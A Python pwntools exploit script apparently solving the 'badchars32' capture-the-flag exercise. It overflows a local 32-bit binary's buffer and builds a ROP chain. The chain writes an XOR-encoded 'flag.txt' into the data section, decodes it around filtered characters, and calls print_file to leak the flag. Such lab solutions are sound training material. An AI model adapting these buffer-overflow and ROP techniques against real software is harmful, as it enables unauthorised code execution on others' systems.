from pwn import *

BINARY = "./badchars32"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY

"""
badchars = 'x', 'g', 'a', '.'
         = 0x78, 0x67, 0x61, 0x2e

"flag.txt" ^ 0x02 == "dnce,vzv"
"""

p = process(BINARY)

data_adr        = 0x0804A018
mov_ptr_edi_esi = p32(0x0804854f) # mov dword ptr [edi], esi ; ret
pop_esi_edi_ebp = p32(0x080485b9) # pop esi ; pop edi ; pop ebp ; ret
xor_ptr_ebp_bl  = p32(0x08048547) # xor byte ptr [ebp], bl ; ret
pop_ebx         = p32(0x0804839d) # pop ebx ; ret
pop_ebp         = p32(0x080485bb) # pop ebp ; ret

rop = b"A" * 44

# Putting the first 4 bytes of xored file in data
rop += pop_esi_edi_ebp
rop += b"dnce"
rop += p32(data_adr)
rop += p32(data_adr)
rop += mov_ptr_edi_esi

# Putting the last 4 bytes of xored file in data
rop += pop_esi_edi_ebp
rop += b",vzv"
rop += p32(data_adr+4)
rop += p32(data_adr)
rop += mov_ptr_edi_esi

# Putting the xoring key in ebx
rop += pop_ebx
rop += p32(2) # xor key

# Xoring 8 first bytes of data section by 0x2 to obtain "flag.txt"
for i in range(8):
    rop += pop_ebp
    rop += p32(data_adr+i)
    rop += xor_ptr_ebp_bl

# print_file("flag.txt")
rop += p32(ELF.symbols['print_file'])
rop += b"BBBB"
rop += p32(data_adr)

p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
